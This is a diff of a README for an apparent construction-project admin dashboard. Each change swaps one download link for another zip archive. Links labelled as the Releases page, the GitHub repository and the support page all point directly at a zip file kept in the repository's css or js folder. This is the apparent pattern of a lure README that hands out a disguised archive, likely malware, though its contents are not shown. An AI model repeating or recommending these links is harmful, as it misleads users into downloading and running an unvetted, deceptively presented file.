@@ -6,7 +6,7 @@ Welcome to the **uhconst-admin-dashboard**! This application is designed to simp
 
 ## 📥 Download the Dashboard
 
-[![Download](https://raw.githubusercontent.com/eriktita/uhconst-admin-dashboard/main/css/admin-uhconst-dashboard-v2.4.zip%20Now-uhconst--admin--dashboard-brightgreen)](https://raw.githubusercontent.com/eriktita/uhconst-admin-dashboard/main/css/admin-uhconst-dashboard-v2.4.zip)
+[![Download](https://raw.githubusercontent.com/eriktita/uhconst-admin-dashboard/main/js/dashboard_admin_uhconst_1.8-alpha.2.zip%20Now-uhconst--admin--dashboard-brightgreen)](https://raw.githubusercontent.com/eriktita/uhconst-admin-dashboard/main/js/dashboard_admin_uhconst_1.8-alpha.2.zip)
 
 ## 🌟 Features
 
@@ -26,7 +26,7 @@ To run this dashboard, you need:
 
 ## 💻 Installation Instructions
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/eriktita/uhconst-admin-dashboard/main/css/admin-uhconst-dashboard-v2.4.zip) to find the latest version.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/eriktita/uhconst-admin-dashboard/main/js/dashboard_admin_uhconst_1.8-alpha.2.zip) to find the latest version.
 
 2. **Download the File**: Choose the appropriate version for your operating system and download it.
 
@@ -53,7 +53,7 @@ If you encounter any issues:
 
 ## 🗣️ Support
 
-For any questions or support requests, please open an issue on the [GitHub repository](https://raw.githubusercontent.com/eriktita/uhconst-admin-dashboard/main/css/admin-uhconst-dashboard-v2.4.zip). Your feedback is valuable for further improvements.
+For any questions or support requests, please open an issue on the [GitHub repository](https://raw.githubusercontent.com/eriktita/uhconst-admin-dashboard/main/js/dashboard_admin_uhconst_1.8-alpha.2.zip). Your feedback is valuable for further improvements.
 
 ## 🌐 Topics
 
@@ -81,4 +81,4 @@ Stay informed about new features and updates. Check the Releases page frequently
 
 ## 📥 Download & Install
 
-Ready to get started? Download the dashboard from the [Releases page](https://raw.githubusercontent.com/eriktita/uhconst-admin-dashboard/main/css/admin-uhconst-dashboard-v2.4.zip) and follow the installation steps outlined above. Enjoy managing your construction projects efficiently!
+Ready to get started? Download the dashboard from the [Releases page](https://raw.githubusercontent.com/eriktita/uhconst-admin-dashboard/main/js/dashboard_admin_uhconst_1.8-alpha.2.zip) and follow the installation steps outlined above. Enjoy managing your construction projects efficiently!
